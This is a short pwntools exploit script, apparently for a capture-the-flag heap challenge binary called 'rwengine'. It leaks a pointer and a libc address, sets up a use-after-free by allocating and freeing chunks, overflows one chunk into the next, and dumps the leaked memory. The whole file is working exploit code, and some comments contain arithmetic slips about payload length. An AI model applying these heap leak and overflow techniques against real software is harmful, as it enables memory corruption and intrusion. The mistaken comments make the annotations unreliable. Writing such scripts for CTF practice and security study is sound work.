from pwn import *
import struct

io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './rwengine'])

def send_pkt(cmd, data=b""):
    length = len(data)
    header = struct.pack(">BH", cmd, length)
    io.send(header + data)

def recv_pkt():
    res_hdr = io.recvn(3)
    status, length = struct.unpack(">BH", res_hdr)
    resp = b""
    if length > 0:
        resp = io.recvn(length)
    return status, resp

# Leak
send_pkt(0x10, b" " * 200)
status, resp = recv_pkt()
page_ptr = u64(resp[543:551])
toupper_addr = u64(resp[551:559])

# Allocate Chunk 0 size 0x20 (32 bytes) -> offset 0x1000
send_pkt(0x12, struct.pack(">H", 0x20))
recv_pkt()

# Allocate Chunk 1 size 0x18 (24 bytes) -> offset 0x1020
send_pkt(0x12, struct.pack(">H", 0x18))
recv_pkt()

# Free Chunk 1 (size 0x18)
send_pkt(0x13, struct.pack(">H", 1))
recv_pkt()

# Call Command 0x15 -> reuses Chunk 1 at offset 0x1020!
send_pkt(0x15)
recv_pkt()

# Free Chunk 0 (size 0x20)
send_pkt(0x13, struct.pack(">H", 0))
recv_pkt()

# Now call Command 0x11 on Chunk 0 (size 0x20) with payload to overflow into Chunk 1!
# 11 spaces (33 bytes) + 8 'A's + 8 'B's = 27 bytes (pad to 32 bytes with 'C')
payload = b" " * 11 + b"A" * 8 + b"B" * 8 + b"C" * 5
print(f"Payload length: {len(payload)}")

send_pkt(0x11, payload)
status, resp = recv_pkt()
print("Command 0x11 status:", status, "resp:", resp)

# Now let's leak the page starting from offset 0x1000!
# How? Command 0x10 copies from page_ptr + 0x100 up to __n_00 bytes!
# If __n_00 = 0x1000 + 0x50 = 0x1050 (4176 bytes)!
# Send 4176 / 3 = 1392 spaces!
send_pkt(0x10, b" " * 1400)
status, resp = recv_pkt()

print("Leaked chunk 1 after overflow:")
# Offset from page_ptr + 0x100 to page_ptr + 0x1020 is 0x1020 - 0x100 = 0xF20 (3872)
# In resp: prefix is 31 bytes, so index = 31 + 3872 = 3903
chunk1_bytes = resp[3903:3903+32]
print(hexdump(chunk1_bytes))

io.close()
